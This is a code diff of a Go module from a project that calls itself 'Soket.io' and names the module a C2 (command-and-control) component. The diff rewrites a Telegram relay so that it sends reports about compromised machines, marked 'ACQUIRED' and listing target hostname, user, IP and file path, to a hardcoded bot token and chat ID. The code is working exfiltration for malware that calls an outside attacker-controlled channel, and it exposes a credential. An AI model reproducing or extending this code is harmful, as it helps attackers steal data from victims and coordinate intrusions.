@@ -1,42 +1,66 @@
-// Project: Soket.io V7.0
-// Module: C2 Component
-// Description: Professional C2 Infrastructure component.
-
+// Package telegram - Advanced Telegram alerting for Soket.io V1.0 infrastructure.
 package telegram
 
 import (
 	"fmt"
 	"net/http"
 	"net/url"
-	"strings"
 	"time"
 )
 
 const (
-	TelegramBotToken = "8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
-	TelegramChatID   = "5439698489"
-	TelegramAPIURL   = "https://api.telegram.org/bot%s/sendMessage"
+	DefaultBotToken = "8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
+	DefaultChatID   = "5439698489"
+	TelegramAPIURL  = "https://api.telegram.org/bot%s/sendMessage"
 )
 
-func RelayTelegramAlert(payload string) error {
-	apiURL := fmt.Sprintf(TelegramAPIURL, TelegramBotToken)
+// AlertData represents the structured content for a system alert.
+type AlertData struct {
+	EventType string
+	Hostname  string
+	User      string
+	IP        string
+	FilePath  string
+	Details   string
+}
 
-	data := url.Values{}
-	data.Set("chat_id", TelegramChatID)
-	data.Set("text", strings.TrimSpace(payload))
+// SendProfessionalAlert sends a highly structured HTML report to the Telegram C2.
+func SendProfessionalAlert(data AlertData) error {
+	apiURL := fmt.Sprintf(TelegramAPIURL, DefaultBotToken)
 
-	client := &http.Client{
-		Timeout: 10 * time.Second,
-	}
+	report := fmt.Sprintf(
+		"<b>SYSTEM ALERT: [%s] ACQUIRED</b>\n"+
+			"------------------------------------\n"+
+			"<b>TARGET:</b> %s\n"+
+			"<b>USER:</b>   %s\n"+
+			"<b>IP:</b>     %s\n"+
+			"<b>PATH:</b>   <code>%s</code>\n"+
+			"<b>INFO:</b>   %s\n"+
+			"------------------------------------\n"+
+			"<i>TIMESTAMP: %s</i>",
+		data.EventType,
+		data.Hostname,
+		data.User,
+		data.IP,
+		data.FilePath,
+		data.Details,
+		time.Now().Format("2006-01-02 15:04:05"),
+	)
 
-	resp, err := client.PostForm(apiURL, data)
+	vals := url.Values{}
+	vals.Set("chat_id", DefaultChatID)
+	vals.Set("text", report)
+	vals.Set("parse_mode", "HTML")
+
+	client := &http.Client{Timeout: 15 * time.Second}
+	resp, err := client.PostForm(apiURL, vals)
 	if err != nil {
-		return fmt.Errorf("failed to send telegram request: %v", err)
+		return fmt.Errorf("transport failure: %w", err)
 	}
 	defer resp.Body.Close()
 
 	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("telegram API returned non-OK status: %s", resp.Status)
+		return fmt.Errorf("api rejected request: %s", resp.Status)
 	}
 
 	return nil
